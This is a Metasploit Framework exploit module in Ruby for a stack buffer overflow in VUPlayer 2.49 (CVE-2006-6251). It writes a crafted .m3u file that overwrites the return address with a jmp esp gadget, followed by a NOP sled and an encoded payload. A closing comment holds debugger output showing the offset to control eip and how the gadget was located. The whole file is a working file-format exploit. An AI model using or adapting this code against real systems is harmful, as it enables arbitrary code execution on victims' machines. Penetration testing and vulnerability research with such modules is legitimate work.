##
# $Id: vuplayer_m3u.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VUPlayer M3U Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack over flow in VUPlayer <= 2.49. When
					the application is used to open a specially crafted m3u file, an buffer is overwritten allowing
					for the execution of arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE', '2006-6251' ],
					[ 'OSVDB', '31710' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00",
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'DisableNops'  =>  'True',
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'VUPlayer 2.49', { 'Ret' => 0x1010539f } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Aug 18 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME',   [ false, 'The file name.',  'msf.m3u']),
			], self.class)
	end

	def exploit

		m3u = rand_text_alpha_upper(2024)

		m3u[1012,4]  = [target.ret].pack('V')
		m3u[1016,12] = "\x90" * 12
		m3u[1028,payload.encoded.length] = payload.encoded

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(m3u)

	end

end
=begin
0:000> r eip
eip=68423768
0:000> !pattern_offset 2024
[Byakugan] Control of ecx at offset 996.
[Byakugan] Control of ebp at offset 1008.
[Byakugan] Control of eip at offset 1012.
0:000> d esp
0012ef44  39684238 42306942 69423169 33694232  8Bh9Bi0Bi1Bi2Bi3
0012ef54  42346942 69423569 37694236 42386942  Bi4Bi5Bi6Bi7Bi8B
0012ef64  6a423969 316a4230 42326a42 6a42336a  i9Bj0Bj1Bj2Bj3Bj
0012ef74  356a4234 42366a42 6a42376a 396a4238  4Bj5Bj6Bj7Bj8Bj9
0012ef84  42306b42 6b42316b 336b4232 42346b42  Bk0Bk1Bk2Bk3Bk4B
0012ef94  6b42356b 376b4236 42386b42 6c42396b  k5Bk6Bk7Bk8Bk9Bl
0:000> s -b 0x10100000 0x1010a000 ff e4
1010539f  ff e4 49 10 10 20 05 93-19 01 00 00 00 9c 53 10  ..I.. ........S.
0:000> u 0x1010539f L1
BASSWMA!BASSplugin+0xe9a:
1010539f ffe4            jmp     esp
=end
